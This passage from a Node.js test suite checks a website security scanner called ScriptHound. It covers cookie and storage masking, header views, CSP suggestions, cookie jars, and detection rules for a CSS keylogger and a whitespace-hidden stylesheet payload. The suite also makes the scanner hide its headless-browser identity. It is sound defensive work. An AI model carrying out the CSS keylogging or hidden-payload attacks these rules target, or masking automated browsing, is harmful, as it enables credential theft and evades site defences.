  check(vp.storage.find((x) => x.key === 'access_token')?.value?.startsWith('eyJhbGciOiJIUzI1NiJ9.'), 'storage values included');
  check(/This report contains live cookie and storage values/.test(sv) && /contains live cookie and storage values/.test(fs.readFileSync(path.join(outDir('values'), 'report.md'), 'utf8')), 'warning banner on console and Markdown output');
  check(/│ abc/.test(sv), 'console prints values under each cookie');
  const svc = await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('values2'), '--urls', `${base}/posture.html`, '--show-values', '--show-cookies', '--color', 'never']);
  check(/Cookies \(/.test(svc) && !/Browser storage \(/.test(svc), '--show-values with --show-cookies shows only the cookie list');

  // --show-headers: response + request headers, security headers marked, secrets masked.
  const sh = await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('headers'), '--urls', `${base}/posture.html`, '--show-headers', '--header', 'X-Test-Auth: hide-me-123', '--color', 'never']);
  check(/Response headers \(HTTP 200\)/.test(sh) && /content-security-policy\s+script-src/i.test(sh) && /missing: .*x-frame-options/.test(sh), '--show-headers lists response headers and marks missing security headers');
  check(/set-cookie\s+PHPSESSID=••••/i.test(sh) && !/PHPSESSID=abc/.test(sh), 'Set-Cookie values masked without --show-values');
  check(/Request headers sent/.test(sh) && /user-agent/.test(sh) && !fs.readFileSync(path.join(outDir('headers'), 'report.json'), 'utf8').includes('hide-me-123'), 'request headers shown; supplied header values never printed or stored');

  // Client hints must agree with the user agent: no "HeadlessChrome" anywhere.
  const hinted = firstSeen.filter((r) => r.headers['sec-ch-ua']);
  check(hinted.length > 0 && hinted.every((r) => !/Headless/i.test(r.headers['sec-ch-ua'] + r.headers['user-agent']) && /Google Chrome/.test(r.headers['sec-ch-ua'])), `client hints match the user agent, no "HeadlessChrome" (${hinted[0]?.headers['sec-ch-ua']})`);
  const uaMajor = /Chrome\/(\d+)/.exec(hinted[0]?.headers['user-agent'] || '')?.[1];
  check(uaMajor && hinted[0].headers['sec-ch-ua'].includes(`v="${uaMajor}"`), `UA version and client-hint version agree (Chrome ${uaMajor})`);

  // --show-html: server HTML + rendered DOM saved, console shows the server HTML and what scripts added.
  const shtml = await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('html'), '--urls', `${base}/`, '--show-html', '--color', 'never']);
  const hp2 = homeOf(outDir('html'));
  check(hp2.html?.server && hp2.html?.rendered && fs.existsSync(path.join(outDir('html'), hp2.html.server.file)) && fs.existsSync(path.join(outDir('html'), hp2.html.rendered.file)), `--show-html saves server and rendered HTML (${hp2.html?.server?.file})`);
  check(/<title>Shop<\/title>/.test(shtml) && /changed by scripts: .*\+\d+ <script>/.test(shtml), `console prints the server HTML and what scripts added (${(shtml.match(/changed by scripts: .*/) || [''])[0]})`);
  check(!JSON.stringify(hp2).includes('<title>Shop</title>'), 'report.json keeps only paths and counts, not the HTML');

  // Every --show-* view goes to every output (HTML always; Markdown when asked).
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('allviews'), '--urls', `${base}/posture.html`, '--format', 'html,md', '--show-scripts', '--show-cookies', '--show-storage', '--show-headers', '--show-html']);
  const rd = (f) => fs.readFileSync(path.join(outDir('allviews'), f), 'utf8');
  const md = rd('report.md');
  check(['Third-party script tree', 'Cookies', 'Browser storage', 'Headers', 'HTML'].every((t) => md.includes(`**${t}**`)) && /PHPSESSID/.test(md) && /changed by scripts/.test(md), 'report.md includes every requested view');
  const html = rd('report.html');
  check(/<title>ScriptHound report/.test(html) && /<link rel="icon" href="data:image\/svg\+xml/.test(html) && /<header class="brand">[\s\S]*?<svg[^>]*aria-label="ScriptHound"/.test(html) && !/c2pa/i.test(html), 'HTML report is branded (title, favicon, inline logo) with no C2PA metadata inlined');
  check(/^# ScriptHound report/.test(md), 'report.md is titled ScriptHound');
  check(/Third-party script tree/.test(html) && /HTML: as sent vs rendered/.test(html) && /Server HTML, first \d+ lines/.test(html) && /widget\.js/.test(html), 'report.html includes the script tree and the HTML view with the server-HTML excerpt');
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('plainmd'), '--urls', `${base}/posture.html`, '--format', 'md']);
  check(!/\*\*Cookies\*\*/.test(fs.readFileSync(path.join(outDir('plainmd'), 'report.md'), 'utf8')), 'without --show-* flags, Markdown stays findings-only');

  // Suggested CSP from what the pages loaded.
  const cspOut = await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('csp'), '--urls', `${base}/,${base}/posture.html`, '--format', 'console,md', '--color', 'never']);
  const cs = JSON.parse(fs.readFileSync(path.join(outDir('csp'), 'report.json'), 'utf8')).sites[0].cspSuggestion;
  const dir = Object.fromEntries((cs?.directives || []).map(([n, srcs]) => [n, srcs]));
  check(/^Content-Security-Policy-Report-Only: default-src 'self'/.test(cs?.header || ''), `suggested CSP generated (${(cs?.header || '').slice(0, 90)}…)`);
  check(dir['script-src']?.includes(`http://localhost:${PORT2}`) && dir['object-src']?.[0] === "'none'" && dir['frame-ancestors']?.[0] === "'self'", `script-src lists the third-party script origin; safe defaults present (${dir['script-src']?.join(' ')})`);
  check(dir['script-src']?.includes("'nonce-{SERVER-GENERATED}'") && cs.notes.some((n) => /look different on every request/.test(n)), 'inline script with a rotating value → nonce recommended, not a hash');
  check(!dir['script-src']?.includes("'unsafe-eval'") && !cs.notes.some((n) => /eval/.test(n)), "no 'unsafe-eval' for pages that don't use eval (the scanner's own evaluate calls aren't counted)");
  check(/suggest\s+a starting policy/.test(cspOut) && /Content-Security-Policy-Report-Only:/.test(cspOut) && /Suggested Content-Security-Policy/.test(fs.readFileSync(path.join(outDir('csp'), 'report.md'), 'utf8')), 'suggestion shown under the CSP finding and in report.md');
  {
    const { suggestCsp } = await import('../lib/csp.mjs');
    const keep = suggestCsp([{ url: 'https://shop.example/', finalUrl: 'https://shop.example/', domains: [], scripts: [], issues: [], docHeaders: { 'content-security-policy': "block-all-mixed-content; frame-ancestors 'none'; report-uri /csp-report" } }]);
    check(/frame-ancestors 'none'/.test(keep.policy) && /block-all-mixed-content/.test(keep.policy) && /report-uri \/csp-report/.test(keep.policy), `existing stricter directives are kept, never loosened (${keep.policy.slice(-90)})`);
    const code = 'window.dataLayer=window.dataLayer||[];';
    const crypto = await import('node:crypto');
    const hex = crypto.createHash('sha256').update(code).digest('hex');
    const sug = suggestCsp([{ url: 'https://shop.example/', finalUrl: 'https://shop.example/', domains: [], scripts: [{ inline: true, sha256: hex, preview: code, origin: { delivered: 'html' } }], issues: [] }]);
    const expected = `'sha256-${crypto.createHash('sha256').update(code).digest('base64')}'`;
    check(sug.directives.find(([n]) => n === 'script-src')[1].includes(expected) && /upgrade-insecure-requests/.test(sug.policy), `stable inline script allowed by its exact CSP hash (${expected})`);
  }

  // CSS attacks: keylogger in an inline <style>, whitespace payload in an external stylesheet.
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('css'), '--urls', `${base}/css-attack.html`]);
  const cp = homeOf(outDir('css'));
  const kl = cp.issues.find((i) => i.rule === 'css-keylogger');
  check(kl?.severity === 'high' && kl.line >= 1 && /inline inline-style#/.test(kl.script), `CSS keylogger in an inline <style> flagged high with a location (${kl?.script} @${kl?.line}:${kl?.column})`);
  const hp = cp.issues.find((i) => i.rule === 'css-hidden-payload');
  check(/\/css\/fonts\.css$/.test(hp?.script || '') && hp.line === 3, `whitespace payload in an external stylesheet flagged at its line (${hp?.script} @${hp?.line})`);
  check(cp.stylesheets.length === 2 && cp.stylesheets.every((st) => st.sha256), 'stylesheets inventoried with hashes');

  const pp = homeOf(outDir('posture'));
  const tok = pp.storage.find((x) => x.key === 'access_token');
  check(tok?.kind === 'jwt' && /^eyJ… \(JWT/.test(tok.preview) && !/c2lnbmF0dXJl/.test(tok.preview), `JWT values are masked in previews (${tok?.preview})`);
  const { findDummyCard } = await import('../lib/storage.mjs');
  const hex = [...'4111111111111111'].map((ch) => ch.charCodeAt(0).toString(16)).join('');
  const { classify } = await import('../lib/storage.mjs');
  check(classify('checkoutstepcompleted') === 'text' && classify(Buffer.from('n=4111111111111111|CP').toString('base64')) === 'base64 blob', 'short base64 recognised without mislabelling plain words');
  check(findDummyCard(hex) === 'hex-encoded' && findDummyCard(encodeURIComponent('4111 1111 1111 1111')) === 'URL-encoded' && findDummyCard('4111 1111 1111 1111') === 'as-is' && findDummyCard(Buffer.from(Buffer.from('4111111111111111').toString('base64')).toString('base64')) === 'double base64-encoded', 'honeytoken check decodes hex, spaced and double-base64 forms');
  check(!findDummyCard('order 4111 total') && !findDummyCard('eyJhbGciOiJIUzI1NiJ9'), 'no false honeytoken match on unrelated values');
}

console.log('--- cookie jars (curl -b / -c)');
{
  const jar = path.join(tmp, 'shop.cookies.txt');
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('jar1'), '--urls', `${base}/posture.html`, '--cookie-jar', jar]);
  const text = fs.readFileSync(jar, 'utf8');
  check(/^# Netscape HTTP Cookie File/.test(text) && /\tPHPSESSID\tabc$/m.test(text) && /\tjs_pref\t1$/m.test(text), '--cookie-jar writes a Netscape-format jar with the cookies');
  check((fs.statSync(jar).mode & 0o777) === 0o600, `jar is readable by the owner only (mode ${(fs.statSync(jar).mode & 0o777).toString(8)})`);
  check(!fs.readFileSync(path.join(outDir('jar1'), 'report.json'), 'utf8').includes('"jar"'), 'cookie values stay out of report.json');
  firstSeen.length = 0;
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('jar2'), '--urls', `${base}/about.html`, '--cookie', jar]);
  const ab = homeOf(outDir('jar2'));
  check(firstSeen.some((r) => r.url === '/about.html' && /PHPSESSID=abc/.test(r.headers.cookie || '') && /js_pref=1/.test(r.headers.cookie || '')), '--cookie <file> sends the jar cookies (curl -b)');
  check(ab.cookies.some((c) => c.name === 'PHPSESSID' && c.setBy === 'cookie jar'), 'jar cookies are labeled "cookie jar"');
  const { parseCookieJar } = await import('../lib/cookiejar.mjs');
  const parsed = parseCookieJar('# Netscape HTTP Cookie File\n#HttpOnly_.example.com\tTRUE\t/\tTRUE\t0\tsid\tx1\nexample.com\tFALSE\t/\tFALSE\t1\told\tgone\n');
  check(parsed.length === 1 && parsed[0].httpOnly && parsed[0].secure && parsed[0].domain === '.example.com', 'parses curl #HttpOnly_ lines and skips expired cookies');
  check(parseCookieJar(JSON.stringify({ cookies: [{ name: 'a', value: '1', domain: 'x.example', path: '/', expires: -1 }] }))[0].name === 'a', 'accepts Playwright storage-state JSON');
}

console.log('--- session: fresh per page vs shared across the site');
{
  const urls = `${base}/posture.html,${base}/about.html`;
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('sess-page'), '--urls', urls]);
  await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('sess-site'), '--urls', urls, '--session', 'site']);
  const about = (dir) => JSON.parse(fs.readFileSync(path.join(dir, 'report.json'), 'utf8')).sites[0].pages.find((p) => p.url.endsWith('about.html'));
  const fresh = about(outDir('sess-page'));
  const shared = about(outDir('sess-site'));
  check(!fresh.cookies.length, `--session page (default): second page starts with no cookies (${fresh.cookies.map((c) => c.name)})`);
  const byName = Object.fromEntries(shared.cookies.map((c) => [c.name, c.setBy]));
  check(byName.PHPSESSID === 'earlier page' && byName.js_pref === 'earlier page', `--session site: cookies carry over and are labeled "earlier page" (${JSON.stringify(byName)})`);
  const keys = Object.keys(JSON.parse(fs.readFileSync(path.join(outDir('sess-site'), 'baseline.next.json'), 'utf8')).pages);
  check(keys.every((k) => k.endsWith('|site-session')), 'shared-session pages get their own baseline keys');
  const cfgSess = path.join(tmp, 'sess-sites.json');
  fs.writeFileSync(cfgSess, JSON.stringify({ options: { waitMs: 300 }, sites: [{ name: 'S', session: 'site', firstParty: ['127.0.0.1'], urls: [`${base}/posture.html`, `${base}/about.html`] }] }));
  await runRaw(['--config', cfgSess, '--baseline', nb, '--out', outDir('sess-cfg')]);
  check(about(outDir('sess-cfg')).cookies.some((c) => c.setBy === 'earlier page'), '"session": "site" in sites.json works too');
}
{
  const { headerChecks, mixedContentCheck, cspScriptWeaknesses } = await import('../lib/posture.mjs');
  check(!cspScriptWeaknesses("script-src 'self' 'nonce-abc' 'unsafe-inline'").length, "'unsafe-inline' ignored when a nonce is present (as browsers do)");
  check(headerChecks({ headers: {}, url: 'https://x.example/' }).some(([, t]) => t === 'hsts-missing'), 'missing HSTS reported on HTTPS pages');
  const mc = mixedContentCheck({ mixed: [{ url: 'http://cdn.example/a.js', type: 'script' }, { url: 'http://cdn.example/a.png', type: 'image' }] });
  check(mc.some(([sev]) => sev === 'medium') && mc.some(([sev]) => sev === 'low'), 'mixed content: scripts medium, images low');
}

const localSm = path.join(tmp, 'local-sitemap.xml');
fs.writeFileSync(localSm, fs.readFileSync(path.join(siteDir, 'sitemap-pages.xml'), 'utf8').replaceAll('BASE', base).replaceAll('PORT2', PORT2));
await runRaw(['--config', opt, '--baseline', nb, '--out', outDir('sm-local'), '--sitemap', localSm]);
check(JSON.stringify(scanned(outDir('sm-local'))) === JSON.stringify(['/about.html', '/deep.html']), `local sitemap file works with no other config: ${scanned(outDir('sm-local'))}`);

console.log('--- docs/jq-recipes.md runs against a real report');
{
  let haveJq = true;
  try {
    await promisify(execFile)('jq', ['--version']);
  } catch {
    haveJq = false;
  }
  if (!haveJq) {
    console.log('SKIP  jq not installed; recipes not checked');
  } else {
    // Use the richest report from this run (posture page with --show-headers etc.).
    const rep = path.join(outDir('allviews'), 'report.json');
    const md = fs.readFileSync(path.join(root, 'docs', 'jq-recipes.md'), 'utf8');
    const blocks = [...md.matchAll(/```bash\n([\s\S]*?)```/g)].map((m) => m[1]).filter((b) => b.includes('jq '));
    let bad = [];
    for (const b of blocks) {
      const cmd = b.replaceAll('reports/report.json', rep).replaceAll('previous/report.json', rep).replace(/\s*>\s*[\w.-]+\.csv\s*$/m, '');
      try {
        await promisify(execFile)('sh', ['-c', cmd]);
      } catch (e) {
        bad.push(`${b.split('\n')[0].slice(0, 60)}… → ${String(e.stderr || e.message).split('\n')[0]}`);
      }
    }
    check(blocks.length >= 10 && !bad.length, `all ${blocks.length} jq recipes run against report.json${bad.length ? ': ' + bad.join(' | ') : ''}`);
  }
}

fs.cpSync(path.join(tmp, 'reports'), path.join(root, 'test', 'sample-report'), { recursive: true });
first.close();
third.close();
console.log(failures ? `\n${failures} check(s) failed` : '\nAll checks passed');
process.exit(failures ? 1 : 0);
